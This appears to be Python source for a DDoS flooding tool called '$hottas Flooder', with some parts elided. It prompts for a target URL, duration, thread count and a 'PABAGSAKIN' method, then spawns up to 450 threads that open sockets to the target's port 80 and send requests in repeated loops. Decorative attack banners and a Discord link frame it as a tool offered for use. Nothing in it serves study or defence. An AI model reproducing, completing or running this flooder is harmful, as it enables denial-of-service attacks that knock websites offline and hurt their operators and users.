...
def display_banner():
    os.system("cls")
    os.system("title $hottas Flooder // User: [@shanxshitzx] // Make: @$han $OS")
    print("""
\033[1;35m       ·▄▄▄▄  ·▄▄▄▄        .▄▄ ·       ▌ ▐··  ▄▄•
\033[1;35m       ██▪ ██ ██▪ ██ ▪     ▐█ ▀.      ▪█·█▌▪ .█▌
\033[1;35m       ▐█· ▐█▌▐█· ▐█▌ ▄█▀▄ ▄▀▀▀█▄      ▐█▐█•  ▀▀•
\033[1;35m       ██. ██ ██. ██ ▐█▌.▐▌▐█▄▪▐█       ███   █▌▪▄█▀
\033[1;35m       ▀▀▀▀▀• ▀▀▀▀▀•  ▀█▄▀▪ ▀▀▀▀       . ▀  ·▀▀▀ • \033[1;31m[\033[1;35mV 1.0\033[1;31m]
\033[1;30m       ===========================================
       \033[1;37m[\033[1;32m#\033[1;37m] \033[1;33m$hottas \033[1;31m| \033[1;32mVersion: \033[1;34m1.0 \033[1;31m| \033[1;36m(\033[1;37m$han-$os\033[1;36m)
       \033[1;37m[\033[1;32m#\033[1;37m] \033[1;33mFlooder \033[1;37mUsing \033[1;32mHTTP/1.1 TLS/1.1 \033[1;31m| \033[1;32m1.2
    """)

def loading_power():
    for i in range(20, 101, 20):
        print(f" \033[1;32mLoading \033[1;31m[\033[1;37m{i}\033[1;31m] \033[1;33mSupper !")
        time.sleep(3)

def attack_banner(target, time_end):
    print(f"""\r
\033[1;31m     +--^----------,--------,-----,--------^-,
\033[1;31m     | \033[1;36m|||||||||   \033[1;31m--------'     |          \033[1;30mO
\033[1;31m     +---------------------------^----------|
\033[1;31m       \_,---------,---------,--------------'
\033[1;31m         / \033[1;30mXXXXXX \033[1;31m/'|       /'
\033[1;31m        / \033[1;30mXXXXXX \033[1;31m/  \    /'  \033[1;35m(\033[1;34mAttacker: \033[1;36m{target})
\033[1;31m       / \033[1;30mXXXXXX \033[1;31m/-------'    \033[1;35m(\033[1;34mPower $hottas \033[1;31m- \033[1;34mDEV-\033[1;35mhttps://discord.gg/UKpKy2aGkv\033)
\033[1;31m      / \033[1;30mXXXXXX \033[1;31m/
\033[1;31m     / \033[1;30mXXXXXX \033[1;31m/
\033[1;31m    (________(
\033[1;31m     ------'
\033[1;31m    [\033[1;36m#\033[1;31m] \033[1;33mAttack End_Time: \033[1;31m[\033[1;32m{time_end}\033[1;31m]
""")
...
def send_requests(host, target, method):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, 80))
        s.settimeout(5)
        if method == "PABAGSAKIN":
            for _ in range(750):
...
def worker(host, target, duration, method):
    end_time = time.time() + duration
    while time.time() < end_time:
        send_requests(host, target, method)

def run_tool():
    display_banner()

    target = input(' \033[1;33mEnter Target: \033[1;34m')
    parsed_url = urlparse(target)
    host = parsed_url.netloc

    duration = int(input(' \033[1;33mDuration: \033[1;34m'))
    if duration > 300:
        duration = 300
        print(" \033[1;31mMax Time \033[1;33m[\033[1;32m300\033[1;33m]")

    thread_count = int(input(' \033[1;33mThread: \033[1;34m'))
    if thread_count > 450:
        thread_count = 450
        print(" \033[1;31mMax Thread Is \033[1;33m[\033[1;32m450\033[1;33m]")

    method = input(' \033[1;33mMethod \033[1;31m[\033[1;33mPABAGSAKIN\033[1;31m]: \033[1;34m').strip().upper()
    if method not in ["PABAGSAKIN"]:
        print("\033[1;31mMethods: \033[1;33m[\033[1;32mPABAGSAKIN\033[1;33m]")
        method = "PABAGSAKIN"

    loading_power()

    os.system("cls")
    time_end = time.strftime("%H:%M:%S", time.localtime(time.time() + duration))
    attack_banner(target, time_end)

    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=worker, args=(host, target, duration, method))
        thread.start()
    ...
    choice = input(" \033[1;31m[\033[1;33mq\033[1;31m] \033[1;33mExitTool \033[1;36m| \033[1;34m[\033[1;31my\033[1;34m] \033[1;33mStop Attack And Quick Home\n \033[1;31m[\033[1;37m#\033[1;31m] \033[1;33mEnter Choose: \033[1;37m")
    if choice.lower() == 'y':
        run_tool()
